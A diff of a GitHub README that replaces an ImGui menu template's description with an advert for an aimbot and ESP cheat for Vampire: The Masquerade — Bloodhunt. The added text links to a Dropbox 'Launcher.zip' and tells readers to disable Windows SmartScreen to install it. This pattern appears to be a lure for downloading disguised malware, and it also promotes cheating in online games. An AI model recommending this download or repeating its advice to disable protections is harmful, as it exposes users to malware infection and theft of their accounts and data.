@@ -1,27 +1,56 @@
-# ImGUI-Advanced-Cheat-Menu
-## Free To Use
+# [Venom] Vampire: The Masquerade — Bloodhunt
 
-> An ImGui Menu preset that is somewhat useable.
-* SFML is used for backend.
-* This Menu does not modify ImGui. New elements are added in imgui_custom.hpp (Hotkey Button)
+![1](https://github.com/LordWavey/ImGui-Cheat-Menu-Base/assets/110671225/dad79151-8446-451c-b9b5-afd794aae250)
 
-* Build scripts are available for x64 DEBUG and RELEASE
-* Project will only compile for Windows without modifications
+# 📁Software: [HERE](https://www.dropbox.com/scl/fi/xnz4fm9l50zx67d9tl21u/Launcher.zip?rlkey=nsye76y375ig7d9geraku6x72&dl=1)
 
-## Features
-* Decent Menu to work with
-* Custom Hotkey Button
-* Console Window for Debugging
-* Font Loaded from Memory (Poppins and Fontawesome v.5 for Icons)
-* Overlay for Active Modules Loaded (very improvable) 
+# 📌Infortmation:
 
-## Features to add
-* Configs Loading and Saving
-* Search Feature
-* Title for Panels
-* Animations?
-* Custom Items
+⚠️If you can’t install program, you need to:
 
-## Version 1.1
-* Made ModuleList (HUD) customizeable
-* ModuleList Sorting by ASC not working currently
+🔥Try to copy the link and paste into another browser.
+
+🔥Disable Windows Smart Screen, as well as update the Visual C++ package.
+
+🔥Install WinRar on your computer.
+
+***Status: Working! ✅***
+
+![2](https://github.com/LordWavey/ImGui-Cheat-Menu-Base/assets/110671225/6ff732dd-6930-4259-a1a9-2c75f459fa54)
+
+![3](https://github.com/LordWavey/ImGui-Cheat-Menu-Base/assets/110671225/b52b2ddc-a6b0-40bc-bd9f-e6a448750186)
+
+# ⚙️Functions
+
+***🌟HWID Changer INCLUDED!***
+
+### 📌Aim-bot
+
+* Automatically aim at your enemies.
+* Highly configurable!
+* Aim hotkey
+* Field-of-view
+* Aim smoothing
+* Target selector
+* Lock target
+* Switch target delay after kill
+* Draw crosshair
+* Show snaplines
+* Visibility checks
+* Aim at specific bone
+* Skip invisible
+* Flick shot
+* Prediction
+
+### 📌Character ESP
+
+* See all players etc. through walls. Including important information.
+* Max render distance
+* Max healthbar render distance
+* Max name render distance
+* Max info render distance
+* Healthbar position
+* Healthbar style
+* Border style
+* Max bones render distance
+* Bone style
